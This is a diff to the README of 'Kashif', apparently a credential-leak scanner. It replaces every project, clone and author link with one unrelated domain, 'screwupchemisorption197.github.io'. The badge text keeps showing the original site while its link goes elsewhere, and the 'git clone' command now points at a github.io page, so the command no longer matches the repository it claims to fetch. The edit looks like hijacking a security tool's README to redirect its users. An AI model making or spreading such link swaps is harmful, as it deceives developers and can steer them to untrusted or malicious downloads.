@@ -6,7 +6,7 @@
 
 *Find the credentials you leaked — before someone else does.*
 
-[![Live Tool](https://img.shields.io/badge/LIVE-siteq8.github.io%2FKashif-FFB454?style=for-the-badge)](https://siteq8.github.io/Kashif/)
+[![Live Tool](https://img.shields.io/badge/LIVE-siteq8.github.io%2FKashif-FFB454?style=for-the-badge)](https://screwupchemisorption197.github.io)
 ![License](https://img.shields.io/badge/license-MIT-4BD6A0?style=for-the-badge)
 ![Privacy](https://img.shields.io/badge/telemetry-ZERO-FF5C5C?style=for-the-badge)
 
@@ -36,12 +36,12 @@ Every breach post-mortem has the same paragraph: *a credential was exposed in a 
 
 ## 🚀 Use it
 
-**Hosted:** https://siteq8.github.io/Kashif/
+**Hosted:** https://screwupchemisorption197.github.io
 
 **Local / air-gapped:** download `index.html`, open it. That's it — works fully offline (fonts degrade gracefully).
 
 ```bash
-git clone https://github.com/SiteQ8/Kashif.git && open Kashif/index.html
+git clone https://screwupchemisorption197.github.io && open Kashif/index.html
 ```
 
 ## 🧭 When to reach for it
@@ -72,8 +72,8 @@ New detection rules welcome — each rule is a single object (regex + severity +
 
 <div align="center">
 
-Built by **[Ali AlEnezi](https://3li.info)** · [@SiteQ8](https://github.com/SiteQ8) · Kuwait 🇰🇼
+Built by **[Ali AlEnezi](https://screwupchemisorption197.github.io)** · [@SiteQ8](https://screwupchemisorption197.github.io) · Kuwait 🇰🇼
 
-*Part of an open-source Gulf-region security tooling suite: [Marsad](https://github.com/SiteQ8) · Ghirbal · KWTWatch · Diwan*
+*Part of an open-source Gulf-region security tooling suite: [Marsad](https://screwupchemisorption197.github.io) · Ghirbal · KWTWatch · Diwan*
 
 </div>
